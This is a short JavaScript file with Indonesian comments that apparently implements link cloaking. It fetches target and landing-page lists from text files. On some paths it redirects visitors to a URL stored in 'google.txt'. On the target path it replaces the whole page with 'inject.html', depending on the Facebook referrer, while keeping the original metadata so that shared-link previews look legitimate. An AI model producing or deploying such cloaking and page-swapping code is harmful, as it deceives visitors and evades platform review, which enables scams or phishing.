(function () {
  const referrer = document.referrer; // Mendapatkan referer
  const userAgent = navigator.userAgent; // Mendapatkan user-agent
  const isFacebookCrawler = /facebookexternalhit|facebook/i.test(userAgent); // Deteksi crawler Facebook
  const currentPath = location.pathname; // Mendapatkan path URL saat ini
  const testing = true; // Flag untuk pengujian

  // Fungsi untuk membaca file eksternal
  const fetchFileContent = async (filePath) => {
    const response = await fetch(filePath);
    if (!response.ok) {
      throw new Error(`Failed to fetch ${filePath}`);
    }
    return response.text();
  };

  // Fungsi untuk menyisipkan metadata asli ke dalam DOM
  const injectMetadata = (metadata) => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(metadata, 'text/html');

    // Sisipkan <title>
    const title = doc.querySelector('title');
    if (title) {
      document.title = title.textContent;
    }

    // Sisipkan <meta> dan <link>
    const head = document.head;
    doc.querySelectorAll('meta, link').forEach((meta) => {
      head.appendChild(meta.cloneNode(true));
    });
  };

  // Membaca URL dari google.txt, target.txt, metadata dari target.txt, dan daftar halaman dari landingpage.txt
  Promise.all([
    fetchFileContent('/google.txt'),
    fetchFileContent('/target.txt'),
    fetchFileContent('/target.txt'), // Ambil metadata asli dari target.txt
    fetchFileContent('/landingpage.txt'), // Ambil daftar halaman dari landingpage.txt
  ])
    .then(([googleUrl, targetUrl, originalHtml, landingPages]) => {
      const landingPageList = landingPages.split('\n').map((page) => page.trim()); // Buat daftar halaman

      if (landingPageList.some((page) => currentPath.includes(page))) {
        // Jika currentPath cocok dengan salah satu halaman di landingpage.txt
        injectMetadata(originalHtml); // Sisipkan metadata asli dari target.txt
        location.href = googleUrl.trim(); // Redirect ke URL dari google.txt
      } else if (currentPath.includes(targetUrl.trim()) && (!referrer.includes('facebook.com') || testing)) {
        // Uji coba tanpa referer Facebook jika testing = true
        fetch('/inject.html')
          .then((response) => {
            if (!response.ok) {
              throw new Error(`Failed to fetch inject.html: ${response.status}`);
            }
            return response.text();
          })
          .then((html) => {
            console.log('Inject HTML fetched successfully:', html); // Log konten inject.html
            document.documentElement.innerHTML = html; // Mengganti seluruh DOM dengan konten inject.html
            injectMetadata(originalHtml); // Sisipkan metadata asli dari target.txt
          })
          .catch((err) => console.error('Error loading inject.html:', err));
      }
    })
    .catch((err) => console.error('Error loading URLs:', err));
})();